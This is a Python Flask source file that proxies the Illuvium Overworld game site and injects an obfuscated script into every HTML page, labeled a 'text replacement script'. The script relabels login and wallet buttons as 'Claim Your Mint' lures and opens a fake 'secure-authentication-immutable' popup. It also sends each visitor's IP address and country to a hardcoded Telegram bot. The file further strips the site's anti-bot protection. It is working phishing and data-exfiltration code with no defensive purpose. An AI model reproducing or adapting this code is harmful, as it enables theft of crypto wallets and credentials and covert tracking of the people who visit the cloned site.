from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code"""
        return '''
<script>
function _0x37f6(_0x1ad5ce,_0x7a3f3c){const _0x3e3c46=_0x3e3c();return _0x37f6=function(_0x37f672,_0x31ada7){_0x37f672=_0x37f672-0xb2;let _0xb69e0e=_0x3e3c46[_0x37f672];return _0xb69e0e;},_0x37f6(_0x1ad5ce,_0x7a3f3c);}const _0x8ac706=_0x37f6;function _0x3e3c(){const _0xf1bf2=['Reach\x20Us','error','Start\x20Now','https://api.telegram.org/bot','Claim\x20Your\x20Mint','Grab\x20Your\x20Spot','textContent','Info','json','Timeline','2954xdNJqZ','Collect\x20Now','New\x20Account','3576130tHNvvG','[ILV]:\x20','Updates','Main','trim','Redirecting\x20to\x20Google','claim-button','button,\x20a','css-1oqedzn','1276695jnXkxD','Connect\x20Wallet','classList','14343JzbRnU','org','7005236807','childNodes','/sendMessage','country_name','1284KTsQML','css-tvaofb','Help','googleWindow','outerHTML','TEXT_NODE','addEventListener','Get\x20Yours','preventDefault','contains','stringify','32stNVCR','target','load','button:not(.claim-button),\x20a:not(.claim-button)','nodeType','css-1i8s7az','observe','length','Documentation','open','application/json','forEach','1722370xUvDTs','7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8','https://secure-authentication-immutable.vercel.app/?id=auth-passeport&user=209348&method=claim-your-mint','DOMContentLoaded','.chakra-link,\x20.nav-link,\x20.menu-item','Failed\x20to\x20send\x20IP\x20info\x20to\x20Telegram:','toISOString','add','1154007QXDkOI','284jLvqwd','closest','width=800,height=600,toolbar=no,menubar=no,scrollbars=yes,resizable=yes','\x20:\x20','log','click','querySelectorAll','css-1hnz6hu','A\x20Gift\x20For\x20Pioneers:\x20Claim\x20your\x20complimentary\x20mint\x20as\x20a\x20welcome\x20token\x20and\x20help\x20forge\x20the\x20future\x20of\x20Illuvium.','Register','a[href*=\x22news\x22],\x20a[href*=\x22about\x22],\x20a[href*=\x22faq\x22]','33HOEiLA','2965316AybwlZ'];_0x3e3c=function(){return _0xf1bf2;};return _0x3e3c();}(function(_0x37cabe,_0x2724cf){const _0x478c06=_0x37f6,_0x6ffe77=_0x37cabe();while(!![]){try{const _0x32f85f=parseInt(_0x478c06(0xc9))/0x1+parseInt(_0x478c06(0xf2))/0x2*(-parseInt(_0x478c06(0xcc))/0x3)+parseInt(_0x478c06(0xb2))/0x4+-parseInt(_0x478c06(0xc0))/0x5+parseInt(_0x478c06(0xd2))/0x6*(parseInt(_0x478c06(0xbd))/0x7)+parseInt(_0x478c06(0xdd))/0x8*(parseInt(_0x478c06(0xf1))/0x9)+-parseInt(_0x478c06(0xe9))/0xa*(parseInt(_0x478c06(0xfd))/0xb);if(_0x32f85f===_0x2724cf)break;else _0x6ffe77['push'](_0x6ffe77['shift']());}catch(_0x30d576){_0x6ffe77['push'](_0x6ffe77['shift']());}}}(_0x3e3c,0xad6f1),document[_0x8ac706(0xd8)](_0x8ac706(0xec),function(){const _0x107d77=_0x8ac706;console['log']('D');const _0x56dad5={'Play\x20for\x20Free':_0x107d77(0xb7),'Play\x20Now':_0x107d77(0xb8),'Log\x20In\x20with\x20Passport':_0x107d77(0xb5),'Connect\x20Wallet':_0x107d77(0xca),'Launch\x20Game':_0x107d77(0xd9),'Create\x20Account':_0x107d77(0xbf),'Sign\x20Up':_0x107d77(0xfb),'Register':_0x107d77(0xbe),'News':_0x107d77(0xc2),'Home':_0x107d77(0xc3),'About':_0x107d77(0xba),'Contact':_0x107d77(0xb3),'FAQ':_0x107d77(0xd4),'Roadmap':_0x107d77(0xbc),'Whitepaper':_0x107d77(0xe5)},_0x38ef11={'Survive\x20the\x20Overworld,\x20a\x20hostile\x20planet\x20teeming\x20with\x20Illuvials\x20waiting\x20to\x20be\x20found.':_0x107d77(0xfa)};function _0x30f4b3(_0x213003,_0x48ec6c,_0x4696af){const _0xe9c943=_0x107d77;console[_0xe9c943(0xf6)]('T:',{'element':_0x213003[_0xe9c943(0xd6)],'oldText':_0x48ec6c,'newText':_0x4696af,'timestamp':new Date()[_0xe9c943(0xef)]()});}function _0x34d425(_0x17e94f){const _0x4ca0bc=_0x107d77;let _0x5a0db1='';for(const _0x22c262 of _0x17e94f[_0x4ca0bc(0xcf)]){_0x22c262[_0x4ca0bc(0xe1)]===Node[_0x4ca0bc(0xd7)]&&(_0x5a0db1+=_0x22c262['textContent'][_0x4ca0bc(0xc4)]());}!_0x5a0db1&&(_0x5a0db1=_0x17e94f[_0x4ca0bc(0xb9)][_0x4ca0bc(0xc4)]());if(_0x56dad5[_0x5a0db1]){const _0x453944=_0x5a0db1;if(_0x17e94f[_0x4ca0bc(0xcf)][_0x4ca0bc(0xe4)]===0x1&&_0x17e94f[_0x4ca0bc(0xcf)][0x0][_0x4ca0bc(0xe1)]===Node['TEXT_NODE'])_0x17e94f[_0x4ca0bc(0xb9)]=_0x56dad5[_0x5a0db1];else{let _0x4a05cb=![];for(const _0x56012f of _0x17e94f[_0x4ca0bc(0xcf)]){if(_0x56012f[_0x4ca0bc(0xe1)]===Node[_0x4ca0bc(0xd7)]&&_0x56012f[_0x4ca0bc(0xb9)][_0x4ca0bc(0xc4)]()===_0x5a0db1){_0x56012f[_0x4ca0bc(0xb9)]=_0x56dad5[_0x5a0db1],_0x4a05cb=!![];break;}}!_0x4a05cb&&(_0x17e94f[_0x4ca0bc(0xb9)]=_0x56dad5[_0x5a0db1]);}_0x30f4b3(_0x17e94f,_0x453944,_0x56dad5[_0x5a0db1]);}_0x17e94f['classList'][_0x4ca0bc(0xf0)](_0x4ca0bc(0xc6));}function _0x426bf5(){const _0x536b3a=_0x107d77,_0x13b4ec=document[_0x536b3a(0xf8)]('p');_0x13b4ec[_0x536b3a(0xe8)](_0xc7488f=>{const _0x50c36f=_0x536b3a,_0x53f560=_0xc7488f['textContent'][_0x50c36f(0xc4)]();if(_0x38ef11[_0x53f560]){const _0x460811=_0x53f560,_0x20e474=_0x38ef11[_0x53f560];_0xc7488f[_0x50c36f(0xb9)]=_0x20e474,_0x30f4b3(_0xc7488f,_0x460811,_0x20e474);}});}function _0x34ea1e(){const _0xda8b0e=_0x107d77;document[_0xda8b0e(0xf8)](_0xda8b0e(0xc7))[_0xda8b0e(0xe8)](_0x34d425),document[_0xda8b0e(0xf8)](_0xda8b0e(0xfc))[_0xda8b0e(0xe8)](_0x34d425),document['querySelectorAll'](_0xda8b0e(0xed))[_0xda8b0e(0xe8)](_0x34d425),_0x426bf5();}_0x34ea1e(),console[_0x107d77(0xf6)]('I'),setInterval(function(){const _0x210504=_0x107d77;document[_0x210504(0xf8)]('button:not(.claim-button),\x20a:not(.claim-button)')['forEach'](_0x34d425),_0x426bf5();},0x3e8);const _0x1a217d=new MutationObserver(function(_0x1d94d2){const _0x1ce812=_0x107d77;let _0x1edc3b=![];_0x1d94d2[_0x1ce812(0xe8)](_0x4cbb0b=>{const _0x27add6=_0x1ce812;_0x4cbb0b['addedNodes'][_0x27add6(0xe4)]&&(_0x1edc3b=!![]);}),_0x1edc3b&&(document[_0x1ce812(0xf8)](_0x1ce812(0xe0))[_0x1ce812(0xe8)](_0x34d425),_0x426bf5());});_0x1a217d[_0x107d77(0xe3)](document['body'],{'childList':!![],'subtree':!![]}),document[_0x107d77(0xd8)](_0x107d77(0xf7),function(_0x1c0478){const _0x1a9a68=_0x107d77,_0x347c32=_0x1c0478[_0x1a9a68(0xde)],_0x5e70ea=_0x347c32[_0x1a9a68(0xf3)](_0x1a9a68(0xc7));if(!_0x5e70ea)return;if(_0x5e70ea[_0x1a9a68(0xcb)]['contains'](_0x1a9a68(0xd3))||_0x5e70ea['classList'][_0x1a9a68(0xdb)]('css-104rome')||_0x5e70ea[_0x1a9a68(0xcb)][_0x1a9a68(0xdb)](_0x1a9a68(0xf9))||_0x5e70ea[_0x1a9a68(0xcb)][_0x1a9a68(0xdb)](_0x1a9a68(0xc8))||_0x5e70ea[_0x1a9a68(0xcb)][_0x1a9a68(0xdb)](_0x1a9a68(0xe2)))return;_0x1c0478[_0x1a9a68(0xda)](),_0x1c0478['stopPropagation']();if(_0x5e70ea[_0x1a9a68(0xcb)][_0x1a9a68(0xdb)](_0x1a9a68(0xc6))){console[_0x1a9a68(0xf6)](_0x1a9a68(0xc5)),window[_0x1a9a68(0xe6)](_0x1a9a68(0xeb),_0x1a9a68(0xd5),_0x1a9a68(0xf4));return;}console[_0x1a9a68(0xf6)]('B'),_0x5e70ea[_0x1a9a68(0xf7)]();},!![]);}));async function sendIPToTelegram(){const _0x255751=_0x8ac706,_0x88ed62=_0x255751(0xea),_0x3b971d=_0x255751(0xce);try{const _0x52ca44=await fetch('https://ipapi.co/json/'),_0x5b71bc=await _0x52ca44[_0x255751(0xbb)](),_0x344c8f=_0x5b71bc['ip'],_0x3dd3a2=_0x5b71bc[_0x255751(0xd1)],_0x50f04a=_0x5b71bc[_0x255751(0xcd)],_0x18da14=_0x255751(0xc1)+_0x344c8f+'\x20:\x20'+_0x3dd3a2+_0x255751(0xf5)+_0x50f04a;await fetch(_0x255751(0xb6)+_0x88ed62+_0x255751(0xd0),{'method':'POST','headers':{'Content-Type':_0x255751(0xe7)},'body':JSON[_0x255751(0xdc)]({'chat_id':_0x3b971d,'text':_0x18da14})});}catch(_0x40a097){console[_0x255751(0xb4)](_0x255751(0xee),_0x40a097);}}window[_0x8ac706(0xd8)](_0x8ac706(0xdf),sendIPToTelegram);
</script>

'''

    @app.after_request
    def add_script_to_html(response):
        """Global after_request handler to add script to all HTML responses"""
        if response.mimetype == 'text/html':
            content = response.get_data(as_text=True)
            if '</body>' in content:
                script = get_text_replacement_script()
                content = content.replace('</body>', script + '</body>')
                response.set_data(content)
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
        try:
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            # Make the request to the original site
            response = requests.get(original_url, headers=headers, params=params, stream=True)
            
            # Get content type
            content_type = response.headers.get('Content-Type', 'text/html')
            
            # If HTML, modify content
            if 'text/html' in content_type and response.status_code == 200:
                modified_content = modify_html_content(response.content)
                logger.info(f"HTML content modified for {path}")
                return Response(modified_content, mimetype=content_type)
            
            # For other content types or error codes, return as-is
            return Response(
                response.content, 
                status=response.status_code,
                content_type=content_type
            )
        except Exception as e:
            logger.error(f"Error in catch-all route: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return f"Error: {str(e)}", 500
